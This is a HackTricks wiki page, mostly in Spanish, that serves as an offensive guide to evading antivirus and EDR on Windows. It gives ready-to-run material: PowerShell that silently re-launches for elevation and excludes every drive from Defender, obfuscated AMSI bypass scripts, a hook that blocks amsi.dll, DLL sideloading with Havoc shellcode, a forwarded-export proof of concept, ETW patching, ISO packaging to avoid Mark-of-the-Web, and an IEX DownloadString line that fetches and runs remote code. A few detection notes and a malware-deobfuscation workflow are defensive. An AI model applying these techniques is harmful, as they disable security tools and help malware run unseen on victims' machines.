# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Esta página fue escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Detener Defender

- [defendnot](https://github.com/es3n1n/defendnot): Una herramienta para impedir que Windows Defender funcione.
- [no-defender](https://github.com/es3n1n/no-defender): Una herramienta para impedir que Windows Defender funcione simulando otro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Cebo UAC estilo instalador antes de manipular Defender

Los public loaders que se hacen pasar por game cheats suelen distribuirse como instaladores unsigned Node.js/Nexe que primero **ask the user for elevation** y solo después neutralizan Defender. El flujo es simple:

1. Comprobar el contexto administrativo con `net session`. El comando solo tiene éxito cuando quien lo ejecuta posee admin rights, por lo que un fallo indica que el loader se está ejecutando como un standard user.
2. Volver a lanzarse inmediatamente con el verbo `RunAs` para disparar el esperado UAC consent prompt mientras preserva la original command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
### Exclusiones globales de `MpPreference` para cada letra de unidad

Una vez con privilegios elevados, las GachiLoader-style chains maximizan los puntos ciegos de Defender en lugar de desactivar el servicio por completo. El loader primero mata el watchdog de la GUI (`taskkill /F /IM SecHealthUI.exe`) y luego aplica **exclusiones extremadamente amplias** para que cada perfil de usuario, directorio del sistema y disco extraíble queden sin posibilidad de escaneo:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.
- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.

Because no Defender service is stopped, naïve health checks keep reporting “antivirus active” even though real-time inspection never touches those paths.

## **Metodología de evasión AV**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Detección estática**

La detección estática se logra marcando cadenas conocidas maliciosas o arrays de bytes en un binario o script, y también extrayendo información del propio archivo (p. ej. file description, company name, digital signatures, icon, checksum, etc.). Esto significa que usar herramientas públicas conocidas puede hacer que te detecten más fácilmente, ya que probablemente ya han sido analizadas y marcadas como maliciosas. Hay un par de formas de sortear este tipo de detección:

- **Encryption**

Si encriptas el binario, no habrá forma de que el AV detecte tu programa, pero necesitarás algún tipo de loader para desencriptar y ejecutar el programa en memoria.

- **Obfuscation**

A veces lo único que necesitas es cambiar algunas cadenas en tu binario o script para pasar al AV, pero esto puede ser una tarea que consuma tiempo dependiendo de lo que intentes ofuscar.

- **Custom tooling**

Si desarrollas tus propias herramientas, no habrá firmas malas conocidas, pero esto requiere mucho tiempo y esfuerzo.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.

### **Análisis dinámico**

El análisis dinámico es cuando el AV ejecuta tu binario en un sandbox y observa actividad maliciosa (p. ej. intentar desencriptar y leer las contraseñas del navegador, realizar un minidump de LSASS, etc.). Esta parte puede ser un poco más complicada, pero aquí tienes algunas cosas que puedes hacer para evadir sandboxes.

- **Sleep before execution** Dependiendo de cómo esté implementado, puede ser una gran forma de evadir el análisis dinámico de AV. Los AVs tienen muy poco tiempo para escanear archivos para no interrumpir el flujo de trabajo del usuario, así que usar sleeps largos puede perturbar el análisis de binarios. El problema es que muchos sandboxes de AV pueden simplemente saltarse el sleep dependiendo de cómo esté implementado.
- **Checking machine's resources** Normalmente los sandboxes tienen muy pocos recursos para trabajar (p. ej. < 2GB RAM), de lo contrario podrían ralentizar la máquina del usuario. Aquí también puedes ser muy creativo, por ejemplo comprobando la temperatura de la CPU o incluso las revoluciones del ventilador; no todo estará implementado en el sandbox.
- **Machine-specific checks** Si quieres apuntar a un usuario cuya estación de trabajo está unida al dominio "contoso.local", puedes comprobar el domain del equipo para ver si coincide con el que especificaste; si no coincide, puedes hacer que tu programa salga.

Resulta que el computername del Sandbox de Microsoft Defender es HAL9TH, así que puedes comprobar el nombre del equipo en tu malware antes de la detonación; si el nombre coincide con HAL9TH, significa que estás dentro del sandbox de Defender, por lo que puedes hacer que tu programa salga.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fuente: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev canal</p></figcaption></figure>

As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:

For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.

The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Recomiendo encarecidamente que **explores DLL Hijackable/Sideloadable programs por tu cuenta**, esta técnica es bastante sigilosa si se hace correctamente, pero si usas programas DLL Sideloadable conocidos públicamente, puedes ser atrapado fácilmente.

El simple hecho de colocar una DLL maliciosa con el nombre que un programa espera cargar no hará que cargue tu payload, ya que el programa espera funciones específicas dentro de esa DLL; para solucionar este problema, usaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** reenvía las llamadas que hace un programa desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y permitiendo manejar la ejecución de tu payload.

Voy a usar el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
El último comando nos dará 2 archivos: una plantilla de código fuente de DLL y la DLL original renombrada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Estos son los resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como la proxy DLL tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me)! Lo consideraría un éxito.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Recomiendo **encarecidamente** que veas [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading y también [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender más a fondo sobre lo que hemos discutido.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Comportamientos clave a entender:
- Si `TargetDll` es una KnownDLL, se suministra desde el espacio de nombres protegido KnownDLLs (p. ej., ntdll, kernelbase, ole32).
- Si `TargetDll` no es una KnownDLL, se usa el orden normal de búsqueda de DLLs, que incluye el directorio del módulo que está realizando la resolución del forward.

Esto habilita una primitiva de sideloading indirecto: encuentra una DLL firmada que exporte una función reenviada a un nombre de módulo no-KnownDLL, y luego coloca junto a esa DLL firmada una DLL controlada por el atacante con exactamente el mismo nombre que el módulo destino reenviado. Cuando se invoque la exportación reenviada, el cargador resuelve el forward y carga tu DLL desde el mismo directorio, ejecutando tu DllMain.

Ejemplo observado en Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` no es un KnownDLL, por lo que se resuelve mediante el orden de búsqueda normal.

PoC (copy-paste):
1) Copiar la DLL del sistema firmada a una carpeta escribible
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloca un `NCRYPTPROV.dll` malicioso en la misma carpeta. Un DllMain mínimo basta para obtener code execution; no necesitas implementar la forwarded function para activar DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Activar el reenvío con un LOLBin firmado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (firmado) carga la side-by-side `keyiso.dll` (firmado)
- Al resolver `KeyIsoSetAuditingInterface`, el loader sigue el reenvío a `NCRYPTPROV.SetAuditingInterface`
- El loader entonces carga `NCRYPTPROV.dll` desde `C:\test` y ejecuta su `DllMain`
- Si `SetAuditingInterface` no está implementado, obtendrás un error de "missing API" solo después de que `DllMain` ya se haya ejecutado

Hunting tips:
- Enfócate en exportaciones reenviadas donde el módulo destino no sea un KnownDLL. KnownDLLs están listados bajo `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puedes enumerar exportaciones reenviadas con herramientas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta el inventario de forwarders de Windows 11 para buscar candidatos: https://hexacorn.com/d/apis_fwd.txt

Ideas de detección/defensa:
- Monitorea LOLBins (p. ej., rundll32.exe) que carguen DLLs firmadas desde rutas no-sistema, seguidas de la carga de non-KnownDLLs con el mismo nombre base desde ese directorio
- Alertar sobre cadenas proceso/módulo como: `rundll32.exe` → no-sistema `keyiso.dll` → `NCRYPTPROV.dll` en rutas escribibles por el usuario
- Aplicar políticas de integridad de código (WDAC/AppLocker) y denegar escritura+ejecución en directorios de aplicaciones

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puedes usar Freeze para cargar y ejecutar tu shellcode de manera sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> La evasión es un juego de gato y ratón: lo que funciona hoy puede detectarse mañana, así que nunca confíes en una sola herramienta; si es posible, intenta encadenar múltiples técnicas de evasión.

## AMSI (Anti-Malware Scan Interface)

AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Initially, AVs were only capable of scanning **files on disk**, so if you could somehow execute payloads **directly in-memory**, the AV couldn't do anything to prevent it, as it didn't have enough visibility.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevación de EXE, COM, MSI o instalación de ActiveX)
- PowerShell (scripts, uso interactivo y evaluación dinámica de código)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

It allows antivirus solutions to inspect script behavior by exposing script contents in a form that is both unencrypted and unobfuscated.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

We didn't drop any file to disk, but still got caught in-memory because of AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Since AMSI mainly works with static detections, therefore, modifying the scripts you try to load can be a good way for evading detection.

However, AMSI has the capability of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.

- **AMSI Bypass**

Since AMSI is implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have found multiple ways to evade AMSI scanning.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Todo lo que se necesitó fue una línea de código de powershell para dejar AMSI inutilizable para el proceso actual de powershell. Esta línea, por supuesto, ha sido detectada por AMSI, por lo que se requiere alguna modificación para poder usar esta técnica.

Aquí hay un bypass de AMSI modificado que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Ten en cuenta que esto probablemente será detectado una vez que se publique esta entrada, por lo que no deberías publicar ningún código si tu objetivo es permanecer indetectado.

**Memory Patching**

Esta técnica fue inicialmente descubierta por [@RastaMouse](https://twitter.com/_RastaMouse/) e implica encontrar la dirección de la función "AmsiScanBuffer" en amsi.dll (responsable de escanear la entrada suministrada por el usuario) y sobrescribirla con instrucciones para devolver el código E_INVALIDARG; de este modo, el resultado del escaneo real devolverá 0, que se interpreta como un resultado limpio.

> [!TIP]
> Por favor lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para una explicación más detallada.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI se inicializa solo después de que `amsi.dll` se carga en el proceso actual. Un bypass robusto e independiente del lenguaje consiste en colocar un hook en modo usuario en `ntdll!LdrLoadDll` que devuelva un error cuando el módulo solicitado sea `amsi.dll`. Como resultado, AMSI nunca se carga y no se realizan escaneos para ese proceso.

Esquema de implementación (pseudocódigo x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona tanto en PowerShell, WScript/CScript como en loaders personalizados (cualquier cosa que de otro modo cargaría AMSI).
- Úsalo junto con el envío de scripts por stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefactos largos en la línea de comandos.
- Se ha visto usado por loaders ejecutados a través de LOLBins (p. ej., `regsvr32` llamando a `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Eliminar la firma detectada**

Puedes usar una herramienta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** y **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para eliminar la firma AMSI detectada de la memoria del proceso actual. Esta herramienta funciona escaneando la memoria del proceso actual en busca de la firma AMSI y luego sobrescribiéndola con instrucciones NOP, eliminándola efectivamente de la memoria.

**Productos AV/EDR que usan AMSI**

Puedes encontrar una lista de productos AV/EDR que usan AMSI en **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usar PowerShell versión 2**
Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin ser escaneados por AMSI. Puedes hacer esto:
```bash
powershell.exe -version 2
```
## Registro de PS

PowerShell logging es una característica que te permite registrar todos los comandos de PowerShell ejecutados en un sistema. Esto puede ser útil para auditoría y resolución de problemas, pero también puede ser un **problema para atacantes que quieran evadir la detección**.

Para eludir el registro de PowerShell, puedes usar las siguientes técnicas:

- **Desactivar PowerShell Transcription y Module Logging**: Puedes usar una herramienta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para este propósito.
- **Usar PowerShell versión 2**: Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin ser escaneados por AMSI. Puedes hacerlo: `powershell.exe -version 2`
- **Usar una Unmanaged Powershell Session**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para spawnear un powershell sin defensas (esto es lo que `powerpick` from Cobal Strike usa).


## Ofuscación

> [!TIP]
> Varias técnicas de ofuscación dependen de cifrar datos, lo que aumentará la entropía del binario y facilitará que AVs y EDRs lo detecten. Ten cuidado con esto y quizá aplica cifrado solo a secciones específicas de tu código que sean sensibles o que necesiten ser ocultas.

### Desofuscando binarios .NET protegidos por ConfuserEx

Al analizar malware que usa ConfuserEx 2 (o forks comerciales) es común enfrentarse a varias capas de protección que bloquearán decompiladores y sandboxes. El flujo de trabajo a continuación **restaura de forma fiable un IL casi original** que después puede ser decompilado a C# en herramientas como dnSpy o ILSpy.

1.  Anti-tampering removal – ConfuserEx encripta cada *method body* y lo desencripta dentro del constructor estático del *module* (`<Module>.cctor`). Esto también parchea el checksum PE por lo que cualquier modificación hará que el binario se bloquee. Usa **AntiTamperKiller** para localizar las tablas de metadata encriptadas, recuperar las claves XOR y reescribir un ensamblado limpio:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La salida contiene los 6 parámetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que pueden ser útiles al construir tu propio unpacker.

2.  Symbol / control-flow recovery – alimenta el archivo *clean* a **de4dot-cex** (un fork de de4dot consciente de ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – selecciona el perfil ConfuserEx 2  
• de4dot deshará el control-flow flattening, restaurará los namespaces, clases y nombres de variables originales y desencriptará las cadenas constantes.

3.  Proxy-call stripping – ConfuserEx reemplaza llamadas directas a métodos con wrappers ligeros (a.k.a *proxy calls*) para romper aún más la decompilación. Elimínalos con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Después de este paso deberías observar APIs .NET normales como `Convert.FromBase64String` o `AES.Create()` en lugar de funciones wrapper opacas (`Class8.smethod_10`, …).

4.  Limpieza manual – ejecuta el binario resultante en dnSpy, busca grandes blobs Base64 o el uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar el *payload* real. A menudo el malware lo almacena como un array de bytes codificado TLV inicializado dentro de `<Module>.byte_0`.

La cadena anterior restaura el flujo de ejecución **sin** necesidad de ejecutar la muestra maliciosa – útil cuando trabajas en una estación offline.

> 🛈  ConfuserEx produce un atributo personalizado llamado `ConfusedByAttribute` que puede usarse como IOC para triage automático de muestras.

#### Comando de una sola línea
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto de la suite de compilación [LLVM](http://www.llvm.org/) capaz de aumentar la seguridad del software mediante [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) y protección contra manipulaciones.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo usar el lenguaje `C++11/14` para generar, en tiempo de compilación, obfuscated code sin usar ninguna herramienta externa y sin modificar el compilador.
- [**obfy**](https://github.com/fritzone/obfy): Añade una capa de obfuscated operations generada por el framework de C++ template metaprogramming que hará la vida de la persona que quiera crackear la aplicación un poco más difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un x64 binary obfuscator capaz de obfuscate varios archivos PE distintos, incluyendo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame es un simple metamorphic code engine para ejecutables arbitrarios.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un fine-grained code obfuscation framework para lenguajes soportados por LLVM que usa ROP (return-oriented programming). ROPfuscator obfuscates un programa a nivel de assembly code transformando instrucciones regulares en ROP chains, frustrando nuestra concepción natural del flujo de control normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un .NET PE Crypter escrito en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor puede convertir EXE/DLL existentes en shellcode y luego cargarlos

## SmartScreen & MoTW

Puede que hayas visto esta pantalla al descargar algunos ejecutables de internet y ejecutarlos.

Microsoft Defender SmartScreen es un mecanismo de seguridad destinado a proteger al usuario final contra la ejecución de aplicaciones potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente con un enfoque basado en reputación, lo que significa que las aplicaciones poco descargadas activarán SmartScreen, alertando y evitando que el usuario final ejecute el archivo (aunque el archivo aún puede ejecutarse haciendo clic en More Info -> Run anyway).

**MoTW** (Mark of The Web) es un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con el nombre Zone.Identifier que se crea automáticamente al descargar archivos de internet, junto con la URL desde la que se descargó.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Comprobando el ADS Zone.Identifier para un archivo descargado de internet.</p></figcaption></figure>

> [!TIP]
> Es importante tener en cuenta que los ejecutables firmados con un certificado de firma **confiable** **no activarán SmartScreen**.

Una forma muy efectiva de evitar que tus payloads obtengan el Mark of The Web es empaquetarlos dentro de algún tipo de contenedor como una ISO. Esto ocurre porque Mark-of-the-Web (MOTW) **no puede** aplicarse a volúmenes **no NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) es una herramienta que empaqueta payloads en contenedores de salida para evadir Mark-of-the-Web.

Ejemplo de uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) es un poderoso mecanismo de registro en Windows que permite a las aplicaciones y componentes del sistema **registrar eventos**. Sin embargo, también puede ser usado por productos de seguridad para monitorizar y detectar actividades maliciosas.

Similar to how AMSI is disabled (bypassed) it's also possible to make the **`EtwEventWrite`** function of the user space process return immediately without logging any events. This is done by patching the function in memory to return immediately, effectively disabling ETW logging for that process.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory has been known for quite some time and it's still a very great way for running your post-exploitation tools without getting caught by AV.

Since the payload will get loaded directly into memory without touching disk, we will only have to worry about patching AMSI for the whole process.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) already provide the ability to execute C# assemblies directly in memory, but there are different ways of doing so:

- **Fork\&Run**

It involves **spawning a new sacrificial process**, inject your post-exploitation malicious code into that new process, execute your malicious code and when finished, kill the new process. This has both its benefits and its drawbacks. The benefit to the fork and run method is that execution occurs **outside** our Beacon implant process. This means that if something in our post-exploitation action goes wrong or gets caught, there is a **much greater chance** of our **implant surviving.** The drawback is that you have a **greater chance** of getting caught by **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

It's about injecting the post-exploitation malicious code **into its own process**. This way, you can avoid having to create a new process and getting it scanned by AV, but the drawback is that if something goes wrong with the execution of your payload, there's a **much greater chance** of **losing your beacon** as it could crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si quieres leer más sobre C# Assembly loading, por favor consulta este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

